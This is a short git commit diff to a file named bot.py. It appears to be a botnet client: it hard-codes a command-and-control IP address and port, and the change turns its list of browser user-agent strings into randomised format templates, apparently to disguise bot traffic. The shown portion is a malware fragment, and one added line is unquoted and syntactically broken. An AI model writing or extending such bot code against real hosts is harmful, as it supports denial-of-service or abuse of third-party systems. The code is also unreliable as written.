e06dd62075c727854b139132669f7eba460648d6
ywvytlwexh <161135338+ywvytlwexh@users.noreply.github.com>
2024-02-28 20:49:05 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -13,13 +13,16 @@ C2_ADDRESS  = '185.84.160.86'
 C2_PORT     = 9999
 
 base_user_agents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (iPod; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.89 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36',
+    Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f
+
+
+    'Mozilla/%.1f (Windows NT 10.0; Win64; x64) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f Safari/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f Safari/%.1f.%.1f',
+    'Mozilla/%.1f (X11; Linux x86_64) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f Safari/%.1f.%.1f',
+    'Mozilla/%.1f (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
+    'Mozilla/%.1f (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
+    'Mozilla/%.1f (iPod; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) CriOS/%.1f.%.1f Mobile/15E148 Safari/%.1f.%.1f',
+    'Mozilla/%.1f (Linux; Android 10; K) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Chrome/%.1f.%.1f Mobile Safari/%.1f.%.1f'
 ]
 
 def rand_ua():
